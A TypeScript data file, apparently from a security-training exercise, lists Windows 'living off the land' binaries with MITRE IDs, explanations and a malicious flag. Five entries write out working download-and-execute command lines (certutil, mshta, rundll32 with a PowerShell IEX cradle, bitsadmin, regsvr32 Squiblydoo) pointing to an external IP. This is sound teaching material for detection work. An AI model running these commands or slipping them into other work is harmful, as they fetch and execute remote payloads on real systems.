import type { LOLBin } from "./types";

export const LOLBINS: LOLBin[] = [
  {
    id: "lol-1",
    processName: "certutil.exe",
    pid: 4872,
    commandLine: "certutil.exe -urlcache -split -f http://45.33.91.200/update.dll C:\\Windows\\Temp\\update.dll",
    isMalicious: true,
    description: "certutil is a legitimate certificate management tool. Here it is abused to download a payload from an external IP, disguising the download as certificate management.",
    mitreId: "T1105",
  },
  {
    id: "lol-2",
    processName: "mshta.exe",
    pid: 6144,
    commandLine: "mshta.exe http://45.33.91.200/payload.hta",
    isMalicious: true,
    description: "mshta.exe executes HTML Applications (.hta). Attackers abuse it to run arbitrary code from remote URLs, bypassing application whitelisting.",
    mitreId: "T1218.005",
  },
  {
    id: "lol-3",
    processName: "rundll32.exe",
    pid: 3296,
    // Educational content: this shows what a malicious rundll32 command looks like in a Task Manager view
    commandLine: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";new ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(iwr http://45.33.91.200/s)\")",
    isMalicious: true,
    description: "rundll32.exe looks normal in Task Manager but the command line reveals it is executing JavaScript to launch a PowerShell download cradle.",
    mitreId: "T1218.011",
  },
  {
    id: "lol-4",
    processName: "bitsadmin.exe",
    pid: 5520,
    commandLine: "bitsadmin /transfer UpdateJob /download /priority foreground http://45.33.91.200/svc.exe C:\\Windows\\Temp\\svc.exe",
    isMalicious: true,
    description: "BITS (Background Intelligent Transfer Service) is a legitimate Windows service for file transfers. Attackers abuse bitsadmin to stealthily download payloads.",
    mitreId: "T1197",
  },
  {
    id: "lol-5",
    processName: "regsvr32.exe",
    pid: 7788,
    commandLine: "regsvr32 /s /n /u /i:http://45.33.91.200/file.sct scrobj.dll",
    isMalicious: true,
    description: "Squiblydoo attack: regsvr32 loads a remote .sct (scriptlet) file via COM, bypassing AppLocker and other application controls.",
    mitreId: "T1218.010",
  },
  {
    id: "lol-6",
    processName: "powershell.exe",
    pid: 2104,
    commandLine: "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\DailyReport.ps1",
    isMalicious: false,
    description: "This is a legitimate scheduled task running a signed PowerShell script for daily reporting. The execution policy is standard, the script path is local, and it matches known IT automation.",
  },
];
